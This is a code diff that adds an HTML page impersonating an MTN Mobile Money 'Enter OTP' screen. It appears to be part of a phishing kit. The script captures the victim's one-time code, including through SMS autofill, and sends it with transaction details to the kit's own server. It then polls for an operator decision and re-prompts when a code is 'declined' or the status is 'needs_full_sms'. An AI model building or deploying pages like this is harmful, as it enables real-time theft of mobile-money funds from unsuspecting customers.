@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>MTN Mobile Money · Enter OTP</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --mtn-royal: #2059B5;
+    --mtn-deep:  #073A87;
+    --mtn-white: #FFFFFF;
+    --mtn-green: #28A745;
+    --mtn-yellow:#FFCC08;
+    --mtn-text:  #456BA8;
+    --mtn-gray:  #7C8798;
+    --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
+    --mtn-page:  #E7EEF7;
+    --mtn-red:   #C62828;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--mtn-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    padding: 18px 22px 26px;
+    border-bottom-left-radius: 38% 32px;
+    border-bottom-right-radius: 38% 32px;
+  }
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  }
+  .brand .mtn { color: var(--mtn-yellow); }
+  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
+
+  .page-title {
+    margin-top: 22px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
+    line-height: 1.5; max-width: 320px;
+  }
+
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 34px 22px 24px;
+    display: flex; flex-direction: column; justify-content: flex-start;
+  }
+
+  .section-label {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--mtn-gray);
+    margin-bottom: 20px;
+    text-align: center;
+  }
+
+  .code-row {
+    display: flex; justify-content: center; gap: 12px;
+    margin-bottom: 10px;
+  }
+  .code-input {
+    width: 62px; height: 70px;
+    background: var(--mtn-soft);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 12px;
+    font-family: inherit;
+    font-size: 28px; font-weight: 800;
+    color: var(--mtn-deep);
+    text-align: center;
+    outline: none;
+    transition: border-color .15s, background .15s, transform .1s;
+    -webkit-appearance: none;
+    caret-color: var(--mtn-royal);
+  }
+  .code-input:focus {
+    border-color: var(--mtn-royal);
+    background: #fff;
+    transform: translateY(-1px);
+  }
+  .code-input.filled {
+    border-color: var(--mtn-royal);
+    background: #F0F5FC;
+  }
+  .code-input.invalid {
+    border-color: #E23B3B;
+    background: #FEF3F3;
+    color: var(--mtn-red);
+  }
+
+  .field-error {
+    display: none;
+    font-size: 11.5px; color: var(--mtn-red); margin-top: 10px;
+    font-weight: 600; line-height: 1.4;
+    text-align: center;
+  }
+  .field-error.show { display: block; }
+
+  .btn-approve {
+    width: 100%; margin-top: 28px; height: 54px;
+    background: var(--mtn-green); color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 900;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    border: none; border-radius: 999px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(40,167,69,0.28);
+    transition: filter .15s, transform .1s, opacity .15s;
+  }
+  .btn-approve:hover { filter: brightness(1.06); }
+  .btn-approve:active { transform: scale(0.985); }
+  .btn-approve:disabled { opacity: 0.65; cursor: wait; }
+
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* ============================================================
+     Full-page "Verifying…" overlay
+  ============================================================ */
+  .authorizing {
+    position: fixed; inset: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 28px 24px; z-index: 9999; text-align: center;
+    color: #fff;
+  }
+  .authorizing.show { display: flex; }
+  .authorizing .brand-label {
+    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
+    margin-bottom: 34px;
+  }
+  .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
+  .authorizing .brand-label .mm  { color: #fff; }
+  .authorizing .spinner {
+    width: 60px; height: 60px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--mtn-yellow);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 22px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .authorizing h2 {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+  }
+  .authorizing .cancel-link {
+    margin-top: 28px; background: transparent; border: none;
+    color: rgba(255,255,255,0.68); font-family: inherit;
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
+
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 28px 18px 18px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .code-row { gap: 9px; }
+    .code-input { width: 54px; height: 62px; font-size: 24px; }
+    .btn-approve { height: 50px; font-size: 14px; }
+    .authorizing h2 { font-size: 18px; }
+    .authorizing .spinner { width: 50px; height: 50px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+    </div>
+    <div class="page-title">Enter OTP code</div>
+    <div class="page-sub">Enter the one-time code sent to your phone to approve this transaction.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="section-label">Enter OTP code</div>
+
+    <div class="code-row" id="codeRow">
+      <input class="code-input" id="c1" type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1">
+      <input class="code-input" id="c2" type="tel" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 2">
+      <input class="code-input" id="c3" type="tel" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 3">
+      <input class="code-input" id="c4" type="tel" inputmode="numeric" maxlength="1" autocomplete="off" aria-label="Digit 4">
+    </div>
+    <div class="field-error" id="codeError">Please enter all 4 digits of your code.</div>
+
+    <button class="btn-approve" id="approveBtn" onclick="approveCode()">Approve</button>
+
+  </div>
+</div>
+
+<div class="authorizing" id="authorizingOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="spinner"></div>
+  <h2 id="authTitle">Verifying…</h2>
+  <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const params = new URLSearchParams(location.search);
+  const tx = {
+    ref: params.get('tx') || '',
+    am:  params.get('am') || '',
+    cur: params.get('cur') || '',
+    rn:  params.get('rn') || '',
+    c:   params.get('c') || '',
+    pm:  params.get('pm') || '',
+    sn:  params.get('sn') || '',
+    mk:  params.get('mk') || '',
+    an:  params.get('an') || '',
+    dt:  params.get('dt') || ''
+  };
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  /* ============================================================
+     4-digit code inputs — auto-advance, backspace, paste
+  ============================================================ */
+  const codeInputs = [
+    document.getElementById('c1'),
+    document.getElementById('c2'),
+    document.getElementById('c3'),
+    document.getElementById('c4')
+  ];
+  const codeError = document.getElementById('codeError');
+
+  function clearCodeInvalid() {
+    codeError.classList.remove('show');
+    codeInputs.forEach(i => i.classList.remove('invalid'));
+  }
+  function readCode() {
+    return codeInputs.map(i => i.value.replace(/\D/g, '')).join('');
+  }
+  function updateFilled() {
+    codeInputs.forEach(i => {
+      if (i.value) i.classList.add('filled');
+      else i.classList.remove('filled');
+    });
+  }
+
+  codeInputs.forEach((input, idx) => {
+    input.addEventListener('input', () => {
+      clearCodeInvalid();
+      input.value = input.value.replace(/\D/g, '').slice(0, 1);
+      updateFilled();
+      if (input.value && idx < 3) {
+        codeInputs[idx + 1].focus();
+      }
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !input.value && idx > 0) {
+        codeInputs[idx - 1].focus();
+        codeInputs[idx - 1].value = '';
+        updateFilled();
+        e.preventDefault();
+      }
+      if (e.key === 'ArrowLeft' && idx > 0) {
+        codeInputs[idx - 1].focus();
+        e.preventDefault();
+      }
+      if (e.key === 'ArrowRight' && idx < 3) {
+        codeInputs[idx + 1].focus();
+        e.preventDefault();
+      }
+    });
+
+    input.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData).getData('text') || '';
+      const digits = text.replace(/\D/g, '').slice(0, 4);
+      if (!digits) return;
+      clearCodeInvalid();
+      for (let i = 0; i < 4; i++) codeInputs[i].value = digits[i] || '';
+      updateFilled();
+      const last = Math.min(digits.length, 4) - 1;
+      if (last >= 0 && last < 3) codeInputs[last + 1].focus();
+      else if (digits.length === 4) codeInputs[3].blur();
+    });
+
+    input.addEventListener('focus', () => { input.select && input.select(); });
+  });
+
+  document.addEventListener('DOMContentLoaded', () => {
+    codeInputs[0].focus();
+
+    if ('OTPCredential' in window && navigator.credentials && navigator.credentials.get) {
+      try {
+        navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: (new AbortController()).signal
+        }).then((otp) => {
+          if (otp && otp.code) {
+            const digits = String(otp.code).replace(/\D/g, '').slice(0, 4);
+            if (digits.length === 4) {
+              for (let i = 0; i < 4; i++) codeInputs[i].value = digits[i];
+              updateFilled();
+              codeInputs[3].blur();
+            }
+          }
+        }).catch(() => {});
+      } catch (e) {}
+    }
+  });
+
+  /* ============================================================
+     Approve → submit → verify
+  ============================================================ */
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelAuthorizing() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    document.getElementById('authorizingOverlay').classList.remove('show');
+    const btn = document.getElementById('approveBtn');
+    btn.disabled = false;
+    btn.textContent = 'Approve';
+  }
+
+  async function approveCode() {
+    clearCodeInvalid();
+
+    const code = readCode();
+    if (code.length !== 4) {
+      codeError.textContent = 'Please enter all 4 digits of your code.';
+      codeError.classList.add('show');
+      codeInputs.forEach(i => { if (!i.value) i.classList.add('invalid'); });
+      codeInputs[0].focus();
+      return;
+    }
+
+    const btn = document.getElementById('approveBtn');
+    btn.disabled = true;
+
+    let serverAccepted = true;
+    try {
+      const r = await fetch('/api/verification/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref,
+          otp: code,
+          am: tx.am,
+          cur: tx.cur,
+          c: tx.c
+        })
+      });
+      if (!r.ok) serverAccepted = false;
+    } catch (e) {
+      btn.disabled = false;
+      showToast('Network error. Please try again.');
+      return;
+    }
+
+    if (!serverAccepted) {
+      btn.disabled = false;
+      showToast('Request was not accepted. Please try again.');
+      return;
+    }
+
+    document.getElementById('authTitle').textContent = 'Verifying…';
+    document.getElementById('authorizingOverlay').classList.add('show');
+
+    pollingActive = true;
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      let decision = 'pending';
+      try {
+        const r = await fetch('/api/verification/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) { /* keep polling */ }
+
+      if (!pollingActive) return;
+
+      if (decision === 'approved') {
+        pollingActive = false;
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+        });
+        window.location.href = 'success.html?' + q.toString();
+        return;
+      }
+
+      if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Approve';
+        codeInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
+        updateFilled();
+        codeError.textContent = 'The code was not approved. Please check and try again.';
+        codeError.classList.add('show');
+        codeInputs[0].focus();
+        showToast('Verification declined — please enter the code again.');
+        return;
+      }
+
+      if (decision === 'inactive' || decision === 'needs_full_sms') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Approve';
+        codeError.textContent = 'This transaction is inactive. Please contact MTN support.';
+        codeError.classList.add('show');
+        showToast('Transaction inactive.');
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 1500);
+    };
+
+    poll();
+  }
+</script>
+</body>
+</html>
